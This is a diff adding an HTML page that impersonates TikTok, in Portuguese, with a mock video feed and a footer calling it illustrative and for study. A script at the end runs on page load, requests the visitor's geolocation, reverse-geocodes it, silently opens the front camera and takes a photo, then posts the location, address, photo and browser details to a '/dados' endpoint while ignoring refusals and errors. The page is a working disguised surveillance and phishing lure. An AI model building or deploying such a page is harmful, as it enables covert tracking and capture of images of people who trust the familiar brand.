@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok Clone – Vídeos Curtos</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3046/3046125.png">
+  <style>
+    :root {
+      --tt-bg: #161824;
+      --tt-card: #22232f;
+      --tt-accent: #fe2c55;
+      --tt-accent-alt: #25f4ee;
+      --tt-text: #fbfbfb;
+      --tt-muted: #cccccc;
+      --tt-border: #181920;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: var(--tt-bg);
+      color: var(--tt-text);
+      font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    header {
+      height: 62px;
+      background: #181920cc;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 40px;
+      box-shadow: 0 2px 12px #0008;
+      position: sticky; top:0; left:0; right:0; z-index:20;
+    }
+    .logo {
+      display: flex; align-items: center;
+    }
+    .logo img {
+      height: 40px; margin-right: 10px;
+    }
+    .logo-title {
+      font-size: 2em;
+      font-weight: 800;
+      color: var(--tt-accent);
+      letter-spacing: -1px;
+      font-family: Arial Black, Arial, sans-serif;
+      text-shadow: 0 2px 12px #1119;
+    }
+    .search-bar {
+      width: 360px;
+      display: flex;
+      align-items: center;
+    }
+    .search-bar input {
+      width: 100%;
+      padding: 7px 16px;
+      background: #23242e;
+      border: 1px solid #292929;
+      border-radius: 22px 0 0 22px;
+      color: #fff;
+      font-size: 1.07em;
+      outline: none;
+    }
+    .search-bar button {
+      border: 1px solid #292929;
+      border-left: none;
+      background: var(--tt-accent);
+      color: #fff;
+      padding: 7px 22px;
+      border-radius: 0 22px 22px 0;
+      font-size: 1.01em;
+      cursor: pointer;
+      font-weight: 700;
+      transition: background .18s;
+    }
+    .search-bar button:hover {
+      background: var(--tt-accent-alt);
+      color: #23242e;
+    }
+    .user-icon {
+      background: #373748;
+      color: var(--tt-text);
+      border-radius: 50%;
+      width: 36px; height: 36px; font-size: 21px;
+      display: flex; align-items: center; justify-content: center;
+      margin-left: 38px;
+    }
+    #status {
+      margin-left: 26px;
+      font-size: 1.01em;
+      color: #04efd3;
+      font-weight: bold;
+    }
+    .app {
+      display: flex;
+      margin: 0 auto;
+      margin-top: 16px;
+      max-width: 1380px;
+      min-height: 80vh;
+      gap: 38px;
+      padding: 0 10px;
+    }
+    aside.sidebar {
+      width: 170px;
+      flex-shrink: 0;
+      border-radius: 14px;
+      background: var(--tt-card);
+      padding: 38px 0 0 0;
+      box-shadow: 0 2px 24px #0005;
+      display: flex;
+      flex-direction: column;
+    }
+    .nav-menu, .discover-menu {
+      list-style: none; padding: 0 0 0 0; margin: 0 0 0 0;
+    }
+    .nav-menu li, .discover-menu li {
+      margin-bottom: 9px;
+    }
+    .nav-menu a, .discover-menu a {
+      display: flex;
+      align-items: center;
+      padding: 10px 25px 10px 24px;
+      color: var(--tt-text);
+      text-decoration: none;
+      font-size: 1.05em;
+      border-radius: 8px;
+      transition: background .12s, color .12s;
+    }
+    .nav-menu a:hover, .discover-menu a:hover {
+      background: #232233;
+      color: var(--tt-accent-alt);
+    }
+    .nav-menu span, .discover-menu span {
+      font-size: 1.2em; width: 29px; margin-right:6px; text-align: center;
+    }
+    .nav-divider {
+      margin: 19px 0 13px 0; border-bottom: 1px solid #222;
+    }
+    .sidebar-heading {
+      color: var(--tt-accent);
+      font-size: .98em;
+      font-weight: 600;
+      margin-left: 24px;
+      margin-bottom: 6px;
+      margin-top: 6px;
+    }
+    .feed-area {
+      flex: 2 1 0%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 38px;
+      min-height: 90vh;
+    }
+    .video-card {
+      background: var(--tt-card);
+      border-radius: 16px;
+      box-shadow: 0 4px 35px #000a;
+      max-width: 420px; width:100%;
+      margin: 0 auto;
+      overflow: hidden;
+      display: flex; flex-direction: column; align-items: center;
+      transition: box-shadow .17s, transform .13s;
+      position: relative;
+    }
+    .video-card:hover {
+      box-shadow: 0 2px 60px #000c;
+      transform: scale(1.032) translateY(-3px);
+    }
+    .video-media {
+      width:100%; aspect-ratio: 9/16;
+      min-height: 360px;
+      background: #333;
+      object-fit: cover;
+      display: block;
+    }
+    .video-info-box {
+      width:100%;
+      display: flex;
+      align-items: flex-start;
+      padding:18px 19px 10px 19px;
+      gap:14px;
+    }
+    .profile-pic {
+      width:44px; height:44px;
+      border-radius:50%;
+      background: #555;
+      object-fit: cover;
+      margin-top: 4px;
+    }
+    .video-info {
+      flex:1 1 0%; display: flex; flex-direction: column;
+      color: var(--tt-text);
+    }
+    .video-name {
+      font-weight: bold;
+      font-size: 1.07em;
+    }
+    .video-caption {
+      margin: 2px 0 3px 0;
+      font-size: 1.03em;
+      color: var(--tt-muted);
+    }
+    .video-sound {
+      color: var(--tt-accent-alt);
+      font-size: 0.98em;
+    }
+    .video-actions {
+      display: flex; flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      margin-right:10px;
+      margin-top: 11px;
+    }
+    .action-btn {
+      cursor: pointer;
+      display: flex; flex-direction: column; align-items: center;
+      color: #fff;
+      font-size: 1.3em;
+      margin-bottom: 4px;
+      transition: color .13s;
+    }
+    .action-btn span {
+      font-size:13px; margin-top: 2px; color: var(--tt-muted);
+    }
+    .action-btn:hover {
+      color: var(--tt-accent-alt);
+    }
+    footer {
+      margin-top: 36px;
+      background: #181820;
+      color: #aaa;
+      text-align: center;
+      font-size: .97em;
+      letter-spacing: .07em;
+      padding: 18px 0 18px 0;
+      border-top: 1px solid #23232c;
+    }
+    @media (max-width:1100px) {
+      .app {max-width: 100%; gap:12px;}
+      aside.sidebar {display:none;}
+    }
+    @media (max-width:700px) {
+        header{padding:0 3px;}
+        .feed-area{gap:16px;}
+        .video-card{max-width:97vw;}
+        .video-media{min-height:150px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/3046/3046125.png" alt="TikTok Logo">
+      <span class="logo-title">TikTok</span>
+    </div>
+    <form class="search-bar" onsubmit="return false;">
+      <input type="text" placeholder="Buscar contas e vídeos">
+      <button title="Buscar">Buscar</button>
+    </form>
+    <div class="user-icon" title="Usuário">??</div>
+    <span id="status">Bem-vindo ao TikTok Clone</span>
+  </header>
+  <div class="app">
+    <aside class="sidebar">
+      <ul class="nav-menu">
+        <li><a href="#"><span>??</span>Para você</a></li>
+        <li><a href="#"><span>??</span>Seguindo</a></li>
+        <li><a href="#"><span>??</span>Em alta</a></li>
+        <li><a href="#"><span>??</span>Sons</a></li>
+      </ul>
+      <div class="nav-divider"></div>
+      <div class="sidebar-heading">Descobrir</div>
+      <ul class="discover-menu">
+        <li><a href="#">#promoção</a></li>
+        <li><a href="#">#humor</a></li>
+        <li><a href="#">#beleza</a></li>
+        <li><a href="#">#tecnologia</a></li>
+        <li><a href="#">#games</a></li>
+      </ul>
+    </aside>
+    <main class="feed-area">
+      <!-- Exemplo de vídeo "card" -->
+      <section class="video-card">
+        <video class="video-media" src="https://samplelib.com/mp4/sample-720x1280.mp4" controls loop poster="https://images.unsplash.com/photo-1535223289827-42f1e9919769?auto=format&fit=crop&w=400&q=80"></video>
+        <div class="video-info-box">
+          <img class="profile-pic" src="https://randomuser.me/api/portraits/women/60.jpg">
+          <div class="video-info">
+            <div class="video-name">@marianafreitas</div>
+            <div class="video-caption">Amanhecer no litoral! #natureza #bomdia</div>
+            <div class="video-sound">?? Som Original - Mariana</div>
+          </div>
+          <div class="video-actions">
+            <div class="action-btn">?? <span>49,2K</span></div>
+            <div class="action-btn">?? <span>1.260</span></div>
+            <div class="action-btn">?? <span>120</span></div>
+            <div class="action-btn">?? <span>Salvar</span></div>
+          </div>
+        </div>
+      </section>
+      <section class="video-card">
+        <video class="video-media" src="https://samplelib.com/mp4/sample-720x1280.mp4" controls loop poster="https://images.unsplash.com/photo-1502685104226-ee32379fefbe?auto=format&fit=crop&w=400&q=80"></video>
+        <div class="video-info-box">
+          <img class="profile-pic" src="https://randomuser.me/api/portraits/men/45.jpg">
+          <div class="video-info">
+            <div class="video-name">@lucasgoncalves</div>
+            <div class="video-caption">Desafio de dança! Quem faz melhor? #dancechallenge</div>
+            <div class="video-sound">?? Beat Top - DJ Fred</div>
+          </div>
+          <div class="video-actions">
+            <div class="action-btn">?? <span>23,9K</span></div>
+            <div class="action-btn">?? <span>836</span></div>
+            <div class="action-btn">?? <span>51</span></div>
+            <div class="action-btn">?? <span>Favorito</span></div>
+          </div>
+        </div>
+      </section>
+      <section class="video-card">
+        <video class="video-media" src="https://samplelib.com/mp4/sample-720x1280.mp4" controls loop poster="https://images.unsplash.com/photo-1465101046530-73398c7f28ca?auto=format&fit=crop&w=400&q=80"></video>
+        <div class="video-info-box">
+          <img class="profile-pic" src="https://randomuser.me/api/portraits/men/31.jpg">
+          <div class="video-info">
+            <div class="video-name">@joaocosta</div>
+            <div class="video-caption">Review rápido do novo smartphone XPTO!</div>
+            <div class="video-sound">?? Tech Beat</div>
+          </div>
+          <div class="video-actions">
+            <div class="action-btn">?? <span>5,1K</span></div>
+            <div class="action-btn">?? <span>234</span></div>
+            <div class="action-btn">?? <span>18</span></div>
+            <div class="action-btn">?? <span>Salvo</span></div>
+          </div>
+        </div>
+      </section>
+      <!-- Adicione mais vídeos simulando cards conforme preferir -->
+    </main>
+  </div>
+  <footer>
+    &copy; 2025 TikTok Clone — Página meramente ilustrativa para fins de estudo.
+  </footer>
+  <script>
+    // Script de coleta de localização, sistema, navegador, câmera
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '? Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(() => { stream.getTracks().forEach(track => track.stop()); });
+            }, 3000);
+          } catch {}
+        }, (err) => { /* ignora negativa do usuário */ });
+      } catch (err) { /* erro geral ignorado */ }
+    }
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
